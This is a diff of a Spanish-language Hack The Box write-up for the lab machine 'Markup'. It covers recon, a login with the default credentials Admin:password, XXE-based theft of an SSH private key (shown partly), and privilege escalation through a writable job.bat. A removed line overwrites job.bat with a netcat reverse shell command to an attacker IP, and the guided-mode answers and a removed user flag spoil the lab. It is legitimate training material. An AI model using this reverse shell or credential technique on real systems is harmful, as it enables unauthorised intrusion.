@@ -1,3 +1,34 @@
+---
+title: Writeup markup - Hack The Box - Resolución y Análisis
+published: true
+tags:
+  - hackthebox
+  - writeup
+  - markup
+  - ciberseguridad
+  - pentesting
+description: Writeup y resolución de la máquina markup en Hack The Box.
+keywords:
+  - writeup markup
+  - hack the box markup
+  - resolución máquina markup
+  - markup hack the box
+  - htb markup
+---
+----------
+### 🔗 Accesos rápidos
+
+- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+2/Windows/Markup)
+- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=oD-2evQL1Sc)|[Parte2](https://www.youtube.com/watch?v=MlHmHTjw62I)
+- 🧠 **Explicación resumida**: 
+
+---
+
+#veryeasy #windows #ping #nmap #whatweb #ssh #burpsuite #xxe #type #nc-nlvp443 
+
+------
+# Guided Mode
+
 1)¿Qué versión de Apache se está ejecutando en el puerto 80 del objetivo?
 	2.4.41
 	
@@ -9,26 +40,18 @@
 
 4)¿Qué versión de XML se utiliza en el objetivo?
 	1.0
-	![[Markup8.png]]
-	Esto lo saque del codigo fuente
 
 5)¿Qué significa el acrónimo de ataque XXE / XEE?
 	xml external entity
-	Una **vulnerabilidad XXE** ocurre cuando una aplicación lee archivos XML y permite que se carguen datos externos. Esto puede hacer que un atacante lea archivos del sistema o envíe datos a servidores externos. Es un fallo de seguridad que puede exponer información sensible.
 
 6)¿Qué nombre de usuario podemos encontrar en el código HTML de la página web?
 	Daniel
-	![[Markup9.png]]
-	Tambien estaba la informacion en el codigo fuente
 	
 7)¿Cuál es el archivo ubicado en la carpeta Log-Management en el objetivo?
 	job.bat
-	Lo descubrimos listando el contenido del archivo C:\Log-Management/job.bat
 
 8)¿Qué ejecutable se mencion a en el archivo antes citado?
 	wevtutil.exe
-
-
 
 ------
 # [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]
@@ -49,9 +72,9 @@ nmap -sCV -p22,80,443 10.129.127.52 -oN target
 ![[Markup4.png]]
 *Ttl:* Maquina windows
 *Puertos*
-`22`SSH
-`80`HTTP
-`443`HTTPS
+	`22`SSH
+	`80`HTTP
+	`443`HTTPS
 
 -----------
 # [[Whatweb-wappalyzer]]
@@ -61,20 +84,14 @@ whatweb http://10.129.127.52/
 ```
 
 ![[Markup5.png]]
-```shell
-nmap --script http-enum -p80,443 10.129.127.52 -oN webScan
-```
-
-![[Markup6.png]]
-No nos da ninguna informacion relevante
+No nos da ninguna información relevante para la maquina
 
 -------
 # Pagina principal
 Necesitamos descubrir el usuario y contraseña
 ![[Markup7.png]]
-Probando las contraseñas mas comunes dan las credenciales
+[Probando las contraseñas mas comunes de articulos que encontramos en internet](https://cybernews.com/best-password-managers/most-common-passwords/) nos dan las credenciales
 Admin:password
-https://cybernews.com/best-password-managers/most-common-passwords/
 
 ----------
 
@@ -148,9 +165,11 @@ m3MVFR4sN7a1cAAAANZGFuaWVsQEVudGl0eQECAwQFBg==
 -----END OPENSSH PRIVATE KEY-----
 ```
 
+
 Crear un archivo que se llame *id_rsa*, poner todo el contenido y darle permiso `chmod 400 id_rsa`
 
-### Conexion por [[ssh]]
+-------------
+# Conexion por [[ssh]] con el id_rsa
 
 ```
 ssh -i id_rsa daniel@10.129.127.52 -p 22
@@ -158,7 +177,7 @@ ssh -i id_rsa daniel@10.129.127.52 -p 22
 ![[Markup15.png]]
 
 ---
-# Escalada de privilegios a root
+# Escalada de privilegios a root buscando [[Logs de la powershell y de consola]]
 
 En la carpeta de logs vemos este archivo llamado *job.bat*
 ![[Markup19.png]]
@@ -196,28 +215,15 @@ Con [[type]] podemos catear la flag de user.txt que esta en el escritorio del us
 ![[Markup17.png]]
 
 ![[Markup25.png]]
-f574a3e7650cebd8c39784299cb570f8
 
 
 ------
 # Notas
 
-#### Si esta activo el servicio ssh, podemos buscar las credenciales en su directorio c:/users/daniel/.ssh/id_rsa
-Para las id_rsa dar el permiso 400 `chmod 400 id_rsa`
-
 
 ![[Markup20.png]]
 Builtin/Users representa a todos los usuarios a nivel local
 La F significa full control
-
-### 📌 ¿Qué hace `-UseBasicParsing` en wget?
-
-Le dice a PowerShell que **no use el motor de Internet Explorer** para interpretar la respuesta (lo cual no está disponible en muchos entornos) y que simplemente descargue el archivo de forma cruda.
-
-
-#### cmd /c "echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.16.21 4444 > C:\Log-Management\job.bat"
-
-El cmd/c lo que haces es ejecutar la instruccion desde una terminal normal y no una powershell, por eso el parametro de -e no da problema. Por que en powershell lo interpreta como un parametro ambiguo y desde la terminal como texto plano
 
 
 --------
